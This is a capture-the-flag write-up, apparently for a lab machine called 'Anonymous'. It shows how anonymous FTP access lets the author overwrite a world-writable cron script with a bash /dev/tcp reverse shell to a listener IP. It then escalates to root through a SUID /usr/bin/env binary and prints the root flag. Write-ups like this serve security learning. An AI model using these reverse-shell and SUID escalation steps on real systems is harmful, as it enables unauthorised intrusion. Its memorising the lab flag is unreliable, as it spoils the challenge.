I really need to disable the anonymous login...it's really not safe

# Initiate Foothold

From the script of ****************clean.sh****************, we can see that it has a simple work-flow:

1. Check if the `$tmp_file` is `0` (means empty) → print the message ************nothing….************
2. If the `$tmp_file` is not empty → remove all the files inside `/tmp/` and log it into the `removed_files.log`

The work-flow of the file is not the main point! Therefore, the set permission of the file is what we should pay attention on:

```bash
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
```

It could be ********read********, ********write********(modify), **************execute************** by anyone (`rwx`) → Therefore, we could modify it to a reverse shell.

# Exploit → Gain Access → Get flag

Download the ****************clean.sh**************** bash file to the local machine → Append it with this payload:

```bash
bash -i >& /dev/tcp/<LOCAL_MACHINE_IP>/<PORT> 0>&1
```

Then use `put` on the `ftp` connection to re-upload the file:

```bash
ftp> put clean.sh 
local: clean.sh remote: clean.sh
229 Entering Extended Passive Mode (|||44552|)
150 Ok to send data.
100% |************************************************************************************************************************************************|   380        7.10 MiB/s    00:00 ETA
226 Transfer complete.
380 bytes sent in 00:00 (0.81 KiB/s)
```

Verify that the content has been changed:

```bash
ftp> more clean.sh
#!/bin/bash

#tmp_files=0
#echo $tmp_files
#if [ $tmp_files=0 ]
#then
#        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
#else
#    for LINE in $tmp_files; do
#        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
#fi

#echo "Hello"

bash -i >& /dev/tcp/10.9.67.75/4444 0>&1
```

Meanwhile, start the ******************Listener****************** on the port which is defined in the payload. Wait for awhile and the reverse shell then establishes the connection:

```tsx
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.9.63.75] from (UNKNOWN) [10.10.248.84] 43744

```

The user’s flag is located in the current directory:

```tsx
namelessone@anonymous:~$ ls -la
ls -la

# Privilege Escalation → root

After checking the ****************cron job**************** but found nothing:

```tsx
namelessone@anonymous:~$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```

The next common technique is finding the `SUID` file’s permission:

```tsx
namelessone@anonymous:/$ find / -perm -04000 2>/dev/null | grep "/usr/bin"
find / -perm -04000 2>/dev/null | grep "/usr/bin"
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/9066/usr/bin/chfn
/snap/core/9066/usr/bin/chsh
/snap/core/9066/usr/bin/gpasswd
/snap/core/9066/usr/bin/newgrp
/snap/core/9066/usr/bin/passwd
/snap/core/9066/usr/bin/sudo
/usr/bin/passwd
/usr/bin/env
/usr/bin/gpasswd
/usr/bin/newuidmap
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/traceroute6.iputils
/usr/bin/at
/usr/bin/pkexec
```

The `env` service is the vulnerability and could be exploited by using this payload:

```tsx
namelessone@anonymous:/$ /usr/bin/env /bin/sh -p
/usr/bin/env /bin/sh -p
id
uid=1000(namelessone) gid=1000(namelessone) euid=0(root) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
whoami
root
```

Go and get the root’s flag simply inside the `/root` directory:

```tsx
cd /root
ls 
root.txt
cat root.txt
4d930091c31a622a7ed10f27999af363
```
